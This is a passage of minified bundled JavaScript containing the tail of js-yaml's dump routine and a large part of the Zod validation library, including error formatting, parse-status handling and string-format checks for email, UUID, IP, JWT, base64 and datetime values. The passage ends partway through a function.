A6(X,J,Q,Y,W,G,H){if(X.tag=null,X.dump=Q,!BH(X,Q,!1))BH(X,Q,!0);var z=TH.call(X.dump),$=Y,V;if(Y)Y=X.flowLevel<0||X.flowLevel>J;var K=z==="[object Object]"||z==="[object Array]",Z,q;if(K)Z=X.duplicates.indexOf(Q),q=Z!==-1;if(X.tag!==null&&X.tag!=="?"||q||X.indent!==2&&J>0)W=!1;if(q&&X.usedDuplicates[Z])X.dump="*ref_"+Z;else{if(K&&q&&!X.usedDuplicates[Z])X.usedDuplicates[Z]=!0;if(z==="[object Object]"){if(Y&&Object.keys(X.dump).length!==0){if(UL(X,J,X.dump,W),q)X.dump="&ref_"+Z+X.dump}else if(KL(X,J,X.dump),q)X.dump="&ref_"+Z+" "+X.dump}else if(z==="[object Array]"){if(Y&&X.dump.length!==0){if(X.noArrayIndent&&!H&&J>0)qH(X,J-1,X.dump,W);else qH(X,J,X.dump,W);if(q)X.dump="&ref_"+Z+X.dump}else if(VL(X,J,X.dump),q)X.dump="&ref_"+Z+" "+X.dump}else if(z==="[object String]"){if(X.tag!=="?")HL(X,X.dump,J,G,$)}else if(z==="[object Undefined]")return!1;else{if(X.skipInvalid)return!1;throw new W9("unacceptable kind of an object to dump "+z)}if(X.tag!==null&&X.tag!=="?"){if(V=encodeURI(X.tag[0]==="!"?X.tag.slice(1):X.tag).replace(/!/g,"%21"),X.tag[0]==="!")V="!"+V;else if(V.slice(0,18)==="tag:yaml.org,2002:")V="!!"+V.slice(18);else V="!<"+V+">";X.dump=V+" "+X.dump}}return!0}function ZL(X,J){var Q=[],Y=[],W,G;gQ(X,Q,Y);for(W=0,G=Y.length;W<G;W+=1)J.duplicates.push(Q[Y[W]]);J.usedDuplicates=Array(G)}function gQ(X,J,Q){var Y,W,G;if(X!==null&&typeof X==="object")if(W=J.indexOf(X),W!==-1){if(Q.indexOf(W)===-1)Q.push(W)}else if(J.push(X),Array.isArray(X))for(W=0,G=X.length;W<G;W+=1)gQ(X[W],J,Q);else{Y=Object.keys(X);for(W=0,G=Y.length;W<G;W+=1)gQ(X[Y[W]],J,Q)}}function qL(X,J){J=J||{};var Q=new JL(J);if(!Q.noRefs)ZL(X,Q);var Y=X;if(Q.replacer)Y=Q.replacer.call({"":Y},"",Y);if(A6(Q,0,Y,!0,!0))return Q.dump+`
`;return""}var BL=qL,ML={dump:BL};function pQ(X,J){return function(){throw Error("Function yaml."+X+" is removed in js-yaml 4. Use yaml."+J+" instead, which is now safe by default.")}}var{load:mH,loadAll:Sh1}=SH,Th1=ML.dump;var _h1=pQ("safeLoad","load"),Eh1=pQ("safeLoadAll","loadAll"),kh1=pQ("safeDump","dump");var V1={};N0(V1,{void:()=>XI,util:()=>i1,unknown:()=>tL,union:()=>WI,undefined:()=>nL,tuple:()=>zI,transformer:()=>OI,symbol:()=>aL,string:()=>nH,strictObject:()=>YI,setErrorMap:()=>RL,set:()=>KI,record:()=>$I,quotelessJson:()=>OL,promise:()=>jI,preprocess:()=>AI,pipeline:()=>DI,ostring:()=>wI,optional:()=>FI,onumber:()=>NI,oboolean:()=>LI,objectUtil:()=>dQ,object:()=>QI,number:()=>sH,nullable:()=>RI,null:()=>sL,never:()=>eL,nativeEnum:()=>MI,nan:()=>dL,map:()=>VI,makeIssue:()=>CJ,literal:()=>qI,lazy:()=>ZI,late:()=>lL,isValid:()=>a6,isDirty:()=>U5,isAsync:()=>Z8,isAborted:()=>K5,intersection:()=>HI,instanceof:()=>pL,getParsedType:()=>J6,getErrorMap:()=>U8,function:()=>UI,enum:()=>BI,effect:()=>OI,discriminatedUnion:()=>GI,defaultErrorMap:()=>D6,datetimeRegex:()=>iH,date:()=>rL,custom:()=>aH,coerce:()=>II,boolean:()=>oH,bigint:()=>iL,array:()=>JI,any:()=>oL,addIssueToContext:()=>H1,ZodVoid:()=>SJ,ZodUnknown:()=>n6,ZodUnion:()=>F8,ZodUndefined:()=>j8,ZodType:()=>c1,ZodTuple:()=>Y6,ZodTransformer:()=>g9,ZodSymbol:()=>PJ,ZodString:()=>f9,ZodSet:()=>IX,ZodSchema:()=>c1,ZodRecord:()=>TJ,ZodReadonly:()=>I8,ZodPromise:()=>CX,ZodPipeline:()=>kJ,ZodParsedType:()=>Q1,ZodOptional:()=>h9,ZodObject:()=>O0,ZodNumber:()=>s6,ZodNullable:()=>N6,ZodNull:()=>O8,ZodNever:()=>Q6,ZodNativeEnum:()=>w8,ZodNaN:()=>EJ,ZodMap:()=>_J,ZodLiteral:()=>D8,ZodLazy:()=>A8,ZodIssueCode:()=>o,ZodIntersection:()=>R8,ZodFunction:()=>B8,ZodFirstPartyTypeKind:()=>T1,ZodError:()=>H9,ZodEnum:()=>t6,ZodEffects:()=>g9,ZodDiscriminatedUnion:()=>Z5,ZodDefault:()=>N8,ZodDate:()=>NX,ZodCatch:()=>L8,ZodBranded:()=>q5,ZodBoolean:()=>M8,ZodBigInt:()=>o6,ZodArray:()=>x9,ZodAny:()=>LX,Schema:()=>c1,ParseStatus:()=>f0,OK:()=>c0,NEVER:()=>CI,INVALID:()=>P1,EMPTY_PATH:()=>AL,DIRTY:()=>wX,BRAND:()=>cL});var i1;(function(X){X.assertEqual=(W)=>{};function J(W){}X.assertIs=J;function Q(W){throw Error()}X.assertNever=Q,X.arrayToEnum=(W)=>{let G={};for(let H of W)G[H]=H;return G},X.getValidEnumValues=(W)=>{let G=X.objectKeys(W).filter((z)=>typeof W[W[z]]!=="number"),H={};for(let z of G)H[z]=W[z];return X.objectValues(H)},X.objectValues=(W)=>{return X.objectKeys(W).map(function(G){return W[G]})},X.objectKeys=typeof Object.keys==="function"?(W)=>Object.keys(W):(W)=>{let G=[];for(let H in W)if(Object.prototype.hasOwnProperty.call(W,H))G.push(H);return G},X.find=(W,G)=>{for(let H of W)if(G(H))return H;return},X.isInteger=typeof Number.isInteger==="function"?(W)=>Number.isInteger(W):(W)=>typeof W==="number"&&Number.isFinite(W)&&Math.floor(W)===W;function Y(W,G=" | "){return W.map((H)=>typeof H==="string"?`'${H}'`:H).join(G)}X.joinValues=Y,X.jsonStringifyReplacer=(W,G)=>{if(typeof G==="bigint")return G.toString();return G}})(i1||(i1={}));var dQ;(function(X){X.mergeShapes=(J,Q)=>{return{...J,...Q}}})(dQ||(dQ={}));var Q1=i1.arrayToEnum(["string","nan","number","integer","float","boolean","date","bigint","symbol","function","undefined","null","array","object","unknown","promise","void","never","map","set"]),J6=(X)=>{switch(typeof X){case"undefined":return Q1.undefined;case"string":return Q1.string;case"number":return Number.isNaN(X)?Q1.nan:Q1.number;case"boolean":return Q1.boolean;case"function":return Q1.function;case"bigint":return Q1.bigint;case"symbol":return Q1.symbol;case"object":if(Array.isArray(X))return Q1.array;if(X===null)return Q1.null;if(X.then&&typeof X.then==="function"&&X.catch&&typeof X.catch==="function")return Q1.promise;if(typeof Map<"u"&&X instanceof Map)return Q1.map;if(typeof Set<"u"&&X instanceof Set)return Q1.set;if(typeof Date<"u"&&X instanceof Date)return Q1.date;return Q1.object;default:return Q1.unknown}};var o=i1.arrayToEnum(["invalid_type","invalid_literal","custom","invalid_union","invalid_union_discriminator","invalid_enum_value","unrecognized_keys","invalid_arguments","invalid_return_type","invalid_date","invalid_string","too_small","too_big","invalid_intersection_types","not_multiple_of","not_finite"]),OL=(X)=>{return JSON.stringify(X,null,2).replace(/"([^"]+)":/g,"$1:")};class H9 extends Error{get errors(){return this.issues}constructor(X){super();this.issues=[],this.addIssue=(Q)=>{this.issues=[...this.issues,Q]},this.addIssues=(Q=[])=>{this.issues=[...this.issues,...Q]};let J=new.target.prototype;if(Object.setPrototypeOf)Object.setPrototypeOf(this,J);else this.__proto__=J;this.name="ZodError",this.issues=X}format(X){let J=X||function(W){return W.message},Q={_errors:[]},Y=(W)=>{for(let G of W.issues)if(G.code==="invalid_union")G.unionErrors.map(Y);else if(G.code==="invalid_return_type")Y(G.returnTypeError);else if(G.code==="invalid_arguments")Y(G.argumentsError);else if(G.path.length===0)Q._errors.push(J(G));else{let H=Q,z=0;while(z<G.path.length){let $=G.path[z];if(z!==G.path.length-1)H[$]=H[$]||{_errors:[]};else H[$]=H[$]||{_errors:[]},H[$]._errors.push(J(G));H=H[$],z++}}};return Y(this),Q}static assert(X){if(!(X instanceof H9))throw Error(`Not a ZodError: ${X}`)}toString(){return this.message}get message(){return JSON.stringify(this.issues,i1.jsonStringifyReplacer,2)}get isEmpty(){return this.issues.length===0}flatten(X=(J)=>J.message){let J={},Q=[];for(let Y of this.issues)if(Y.path.length>0){let W=Y.path[0];J[W]=J[W]||[],J[W].push(X(Y))}else Q.push(X(Y));return{formErrors:Q,fieldErrors:J}}get formErrors(){return this.flatten()}}H9.create=(X)=>{return new H9(X)};var FL=(X,J)=>{let Q;switch(X.code){case o.invalid_type:if(X.received===Q1.undefined)Q="Required";else Q=`Expected ${X.expected}, received ${X.received}`;break;case o.invalid_literal:Q=`Invalid literal value, expected ${JSON.stringify(X.expected,i1.jsonStringifyReplacer)}`;break;case o.unrecognized_keys:Q=`Unrecognized key(s) in object: ${i1.joinValues(X.keys,", ")}`;break;case o.invalid_union:Q="Invalid input";break;case o.invalid_union_discriminator:Q=`Invalid discriminator value. Expected ${i1.joinValues(X.options)}`;break;case o.invalid_enum_value:Q=`Invalid enum value. Expected ${i1.joinValues(X.options)}, received '${X.received}'`;break;case o.invalid_arguments:Q="Invalid function arguments";break;case o.invalid_return_type:Q="Invalid function return type";break;case o.invalid_date:Q="Invalid date";break;case o.invalid_string:if(typeof X.validation==="object")if("includes"in X.validation){if(Q=`Invalid input: must include "${X.validation.includes}"`,typeof X.validation.position==="number")Q=`${Q} at one or more positions greater than or equal to ${X.validation.position}`}else if("startsWith"in X.validation)Q=`Invalid input: must start with "${X.validation.startsWith}"`;else if("endsWith"in X.validation)Q=`Invalid input: must end with "${X.validation.endsWith}"`;else i1.assertNever(X.validation);else if(X.validation!=="regex")Q=`Invalid ${X.validation}`;else Q="Invalid";break;case o.too_small:if(X.type==="array")Q=`Array must contain ${X.exact?"exactly":X.inclusive?"at least":"more than"} ${X.minimum} element(s)`;else if(X.type==="string")Q=`String must contain ${X.exact?"exactly":X.inclusive?"at least":"over"} ${X.minimum} character(s)`;else if(X.type==="number")Q=`Number must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${X.minimum}`;else if(X.type==="bigint")Q=`Number must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${X.minimum}`;else if(X.type==="date")Q=`Date must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${new Date(Number(X.minimum))}`;else Q="Invalid input";break;case o.too_big:if(X.type==="array")Q=`Array must contain ${X.exact?"exactly":X.inclusive?"at most":"less than"} ${X.maximum} element(s)`;else if(X.type==="string")Q=`String must contain ${X.exact?"exactly":X.inclusive?"at most":"under"} ${X.maximum} character(s)`;else if(X.type==="number")Q=`Number must be ${X.exact?"exactly":X.inclusive?"less than or equal to":"less than"} ${X.maximum}`;else if(X.type==="bigint")Q=`BigInt must be ${X.exact?"exactly":X.inclusive?"less than or equal to":"less than"} ${X.maximum}`;else if(X.type==="date")Q=`Date must be ${X.exact?"exactly":X.inclusive?"smaller than or equal to":"smaller than"} ${new Date(Number(X.maximum))}`;else Q="Invalid input";break;case o.custom:Q="Invalid input";break;case o.invalid_intersection_types:Q="Intersection results could not be merged";break;case o.not_multiple_of:Q=`Number must be a multiple of ${X.multipleOf}`;break;case o.not_finite:Q="Number must be finite";break;default:Q=J.defaultError,i1.assertNever(X)}return{message:Q}},D6=FL;var uH=D6;function RL(X){uH=X}function U8(){return uH}var CJ=(X)=>{let{data:J,path:Q,errorMaps:Y,issueData:W}=X,G=[...Q,...W.path||[]],H={...W,path:G};if(W.message!==void 0)return{...W,path:G,message:W.message};let z="",$=Y.filter((V)=>!!V).slice().reverse();for(let V of $)z=V(H,{data:J,defaultError:z}).message;return{...W,path:G,message:z}},AL=[];function H1(X,J){let Q=U8(),Y=CJ({issueData:J,data:X.data,path:X.path,errorMaps:[X.common.contextualErrorMap,X.schemaErrorMap,Q,Q===D6?void 0:D6].filter((W)=>!!W)});X.common.issues.push(Y)}class f0{constructor(){this.value="valid"}dirty(){if(this.value==="valid")this.value="dirty"}abort(){if(this.value!=="aborted")this.value="aborted"}static mergeArray(X,J){let Q=[];for(let Y of J){if(Y.status==="aborted")return P1;if(Y.status==="dirty")X.dirty();Q.push(Y.value)}return{status:X.value,value:Q}}static async mergeObjectAsync(X,J){let Q=[];for(let Y of J){let W=await Y.key,G=await Y.value;Q.push({key:W,value:G})}return f0.mergeObjectSync(X,Q)}static mergeObjectSync(X,J){let Q={};for(let Y of J){let{key:W,value:G}=Y;if(W.status==="aborted")return P1;if(G.status==="aborted")return P1;if(W.status==="dirty")X.dirty();if(G.status==="dirty")X.dirty();if(W.value!=="__proto__"&&(typeof G.value<"u"||Y.alwaysSet))Q[W.value]=G.value}return{status:X.value,value:Q}}}var P1=Object.freeze({status:"aborted"}),wX=(X)=>({status:"dirty",value:X}),c0=(X)=>({status:"valid",value:X}),K5=(X)=>X.status==="aborted",U5=(X)=>X.status==="dirty",a6=(X)=>X.status==="valid",Z8=(X)=>typeof Promise<"u"&&X instanceof Promise;var B1;(function(X){X.errToObj=(J)=>typeof J==="string"?{message:J}:J||{},X.toString=(J)=>typeof J==="string"?J:J?.message})(B1||(B1={}));class y9{constructor(X,J,Q,Y){this._cachedPath=[],this.parent=X,this.data=J,this._path=Q,this._key=Y}get path(){if(!this._cachedPath.length)if(Array.isArray(this._key))this._cachedPath.push(...this._path,...this._key);else this._cachedPath.push(...this._path,this._key);return this._cachedPath}}var cH=(X,J)=>{if(a6(J))return{success:!0,data:J.value};else{if(!X.common.issues.length)throw Error("Validation failed but no issues detected.");return{success:!1,get error(){if(this._error)return this._error;let Q=new H9(X.common.issues);return this._error=Q,this._error}}}};function x1(X){if(!X)return{};let{errorMap:J,invalid_type_error:Q,required_error:Y,description:W}=X;if(J&&(Q||Y))throw Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);if(J)return{errorMap:J,description:W};return{errorMap:(H,z)=>{let{message:$}=X;if(H.code==="invalid_enum_value")return{message:$??z.defaultError};if(typeof z.data>"u")return{message:$??Y??z.defaultError};if(H.code!=="invalid_type")return{message:z.defaultError};return{message:$??Q??z.defaultError}},description:W}}class c1{get description(){return this._def.description}_getType(X){return J6(X.data)}_getOrReturnCtx(X,J){return J||{common:X.parent.common,data:X.data,parsedType:J6(X.data),schemaErrorMap:this._def.errorMap,path:X.path,parent:X.parent}}_processInputParams(X){return{status:new f0,ctx:{common:X.parent.common,data:X.data,parsedType:J6(X.data),schemaErrorMap:this._def.errorMap,path:X.path,parent:X.parent}}}_parseSync(X){let J=this._parse(X);if(Z8(J))throw Error("Synchronous parse encountered promise.");return J}_parseAsync(X){let J=this._parse(X);return Promise.resolve(J)}parse(X,J){let Q=this.safeParse(X,J);if(Q.success)return Q.data;throw Q.error}safeParse(X,J){let Q={common:{issues:[],async:J?.async??!1,contextualErrorMap:J?.errorMap},path:J?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:J6(X)},Y=this._parseSync({data:X,path:Q.path,parent:Q});return cH(Q,Y)}"~validate"(X){let J={common:{issues:[],async:!!this["~standard"].async},path:[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:J6(X)};if(!this["~standard"].async)try{let Q=this._parseSync({data:X,path:[],parent:J});return a6(Q)?{value:Q.value}:{issues:J.common.issues}}catch(Q){if(Q?.message?.toLowerCase()?.includes("encountered"))this["~standard"].async=!0;J.common={issues:[],async:!0}}return this._parseAsync({data:X,path:[],parent:J}).then((Q)=>a6(Q)?{value:Q.value}:{issues:J.common.issues})}async parseAsync(X,J){let Q=await this.safeParseAsync(X,J);if(Q.success)return Q.data;throw Q.error}async safeParseAsync(X,J){let Q={common:{issues:[],contextualErrorMap:J?.errorMap,async:!0},path:J?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:J6(X)},Y=this._parse({data:X,path:Q.path,parent:Q}),W=await(Z8(Y)?Y:Promise.resolve(Y));return cH(Q,W)}refine(X,J){let Q=(Y)=>{if(typeof J==="string"||typeof J>"u")return{message:J};else if(typeof J==="function")return J(Y);else return J};return this._refinement((Y,W)=>{let G=X(Y),H=()=>W.addIssue({code:o.custom,...Q(Y)});if(typeof Promise<"u"&&G instanceof Promise)return G.then((z)=>{if(!z)return H(),!1;else return!0});if(!G)return H(),!1;else return!0})}refinement(X,J){return this._refinement((Q,Y)=>{if(!X(Q))return Y.addIssue(typeof J==="function"?J(Q,Y):J),!1;else return!0})}_refinement(X){return new g9({schema:this,typeName:T1.ZodEffects,effect:{type:"refinement",refinement:X}})}superRefine(X){return this._refinement(X)}constructor(X){this.spa=this.safeParseAsync,this._def=X,this.parse=this.parse.bind(this),this.safeParse=this.safeParse.bind(this),this.parseAsync=this.parseAsync.bind(this),this.safeParseAsync=this.safeParseAsync.bind(this),this.spa=this.spa.bind(this),this.refine=this.refine.bind(this),this.refinement=this.refinement.bind(this),this.superRefine=this.superRefine.bind(this),this.optional=this.optional.bind(this),this.nullable=this.nullable.bind(this),this.nullish=this.nullish.bind(this),this.array=this.array.bind(this),this.promise=this.promise.bind(this),this.or=this.or.bind(this),this.and=this.and.bind(this),this.transform=this.transform.bind(this),this.brand=this.brand.bind(this),this.default=this.default.bind(this),this.catch=this.catch.bind(this),this.describe=this.describe.bind(this),this.pipe=this.pipe.bind(this),this.readonly=this.readonly.bind(this),this.isNullable=this.isNullable.bind(this),this.isOptional=this.isOptional.bind(this),this["~standard"]={version:1,vendor:"zod",validate:(J)=>this["~validate"](J)}}optional(){return h9.create(this,this._def)}nullable(){return N6.create(this,this._def)}nullish(){return this.nullable().optional()}array(){return x9.create(this)}promise(){return CX.create(this,this._def)}or(X){return F8.create([this,X],this._def)}and(X){return R8.create(this,X,this._def)}transform(X){return new g9({...x1(this._def),schema:this,typeName:T1.ZodEffects,effect:{type:"transform",transform:X}})}default(X){let J=typeof X==="function"?X:()=>X;return new N8({...x1(this._def),innerType:this,defaultValue:J,typeName:T1.ZodDefault})}brand(){return new q5({typeName:T1.ZodBranded,type:this,...x1(this._def)})}catch(X){let J=typeof X==="function"?X:()=>X;return new L8({...x1(this._def),innerType:this,catchValue:J,typeName:T1.ZodCatch})}describe(X){return new this.constructor({...this._def,description:X})}pipe(X){return kJ.create(this,X)}readonly(){return I8.create(this)}isOptional(){return this.safeParse(void 0).success}isNullable(){return this.safeParse(null).success}}var DL=/^c[^\s-]{8,}$/i,wL=/^[0-9a-z]+$/,NL=/^[0-9A-HJKMNP-TV-Z]{26}$/i,LL=/^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,IL=/^[a-z0-9_-]{21}$/i,CL=/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$/,PL=/^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/,SL=/^(?!\.)(?!.*\.\.)([A-Z0-9_'+\-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i,TL="^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$",iQ,_L=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/,EL=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/(3[0-2]|[12]?[0-9])$/,kL=/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/,bL=/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/,vL=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/,fL=/^([0-9a-zA-Z-_]{4})*(([0-9a-zA-Z-_]{2}(==)?)|([0-9a-zA-Z-_]{3}(=)?))?$/,pH="((\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-((0[13578]|1[02])-(0[1-9]|[12]\\d|3[01])|(0[469]|11)-(0[1-9]|[12]\\d|30)|(02)-(0[1-9]|1\\d|2[0-8])))",xL=new RegExp(`^${pH}$`);function dH(X){let J="[0-5]\\d";if(X.precision)J=`${J}\\.\\d{${X.precision}}`;else if(X.precision==null)J=`${J}(\\.\\d+)?`;let Q=X.precision?"+":"?";return`([01]\\d|2[0-3]):[0-5]\\d(:${J})${Q}`}function hL(X){return new RegExp(`^${dH(X)}$`)}function iH(X){let J=`${pH}T${dH(X)}`,Q=[];if(Q.push(X.local?"Z?":"Z"),X.offset)Q.push("([+-]\\d{2}:?\\d{2})");return J=`${J}(${Q.join("|")})`,new RegExp(`^${J}$`)}function yL(X,J){if((J==="v4"||!J)&&_L.test(X))return!0;if((J==="v6"||!J)&&kL.test(X))return!0;return!1}function gL(X,J){if(!CL.test(X))return!1;try{let[Q]=X.split(".");if(!Q)return!1;let Y=Q.replace(/-/g,"+").replace(/_/g,"/").padEnd(Q.length+(4-Q.length%4)%4,"="),W=JSON.parse(atob(Y));if(typeof W!=="object"||W===null)return!1;if("typ"in W&&W?.typ!=="JWT")return!1;if(!W.alg)return!1;if(J&&W.alg!==J)return!1;return!0}catch{return!1}}function mL(X,J){if((J==="v4"||!J)&&EL.test(X))return!0;if((J==="v6"||!J)&&bL.test(X))return!0;return!1}class f9 extends c1{_parse(X){if(this._def.coerce)X.data=String(X.data);if(this._getType(X)!==Q1.string){let W=this._getOrReturnCtx(X);return H1(W,{code:o.invalid_type,expected:Q1.string,received:W.parsedType}),P1}let Q=new f0,Y=void 0;for(let W of this._def.checks)if(W.kind==="min"){if(X.data.length<W.value)Y=this._getOrReturnCtx(X,Y),H1(Y,{code:o.too_small,minimum:W.value,type:"string",inclusive:!0,exact:!1,message:W.message}),Q.dirty()}else if(W.kind==="max"){if(X.data.length>W.value)Y=this._getOrReturnCtx(X,Y),H1(Y,{code:o.too_big,maximum:W.value,type:"string",inclusive:!0,exact:!1,message:W.message}),Q.dirty()}else if(W.kind==="length"){let G=X.data.length>W.value,H=X.data.length<W.value;if(G||H){if(Y=this._getOrReturnCtx(X,Y),G)H1(Y,{code:o.too_big,maximum:W.value,type:"string",inclusive:!0,exact:!0,message:W.message});else if(H)H1(Y,{code:o.too_small,minimum:W.value,type:"string",inclusive:!0,exact:!0,message:W.message});Q.dirty()}}else if(W.kind==="email"){if(!SL.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"email",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="emoji"){if(!iQ)iQ=new RegExp(TL,"u");if(!iQ.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"emoji",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="uuid"){if(!LL.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"uuid",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="nanoid"){if(!IL.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"nanoid",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="cuid"){if(!DL.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"cuid",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="cuid2"){if(!wL.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"cuid2",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="ulid"){if(!NL.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"ulid",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="url")try{new URL(X.data)}catch{Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"url",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="regex"){if(W.regex.lastIndex=0,!W.regex.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"regex",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="trim")X.data=X.data.trim();else if(W.kind==="includes"){if(!X.data.includes(W.value,W.position))Y=this._getOrReturnCtx(X,Y),H1(Y,{code:o.invalid_string,validation:{includes:W.value,position:W.position},message:W.message}),Q.dirty()}else if(W.kind==="toLowerCase")X.data=X.data.toLowerCase();else if(W.kind==="toUpperCase")X.data=X.data.toUpperCase();else if(W.kind==="startsWith"){if(!X.data.startsWith(W.value))Y=this._getOrReturnCtx(X,Y),H1(Y,{code:o.invalid_string,validation:{startsWith:W.value},message:W.message}),Q.dirty()}else if(W.kind==="endsWith"){if(!X.data.endsWith(W.value))Y=this._getOrReturnCtx(X,Y),H1(Y,{code:o.invalid_string,validation:{endsWith:W.value},message:W.message}),Q.dirty()}else if(W.kind==="datetime"){if(!iH(W).test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{code:o.invalid_string,validation:"datetime",message:W.message}),Q.dirty()}else if(W.kind==="date"){if(!xL.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{code:o.invalid_string,validation:"date",message:W.message}),Q.dirty()}else if(W.kind==="time"){if(!hL(W).test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{code:o.invalid_string,validation:"time",message:W.message}),Q.dirty()}else if(W.kind==="duration"){if(!PL.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"duration",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="ip"){if(!yL(X.data,W.version))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"ip",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="jwt"){if(!gL(X.data,W.alg))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"jwt",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="cidr"){if(!mL(X.data,W.version))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"cidr",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="base64"){if(!vL.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"base64",code:o.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="base64url"){if(!fL.test(X.data))Y=this._getOrReturnCtx(X,Y),H1(Y,{validation:"base64url",code:o.invalid_string,message:W.message}),Q.dirty()}else i1.assertNever(W);return{status:Q.value,value:X.data}}_regex(X,J,Q){return 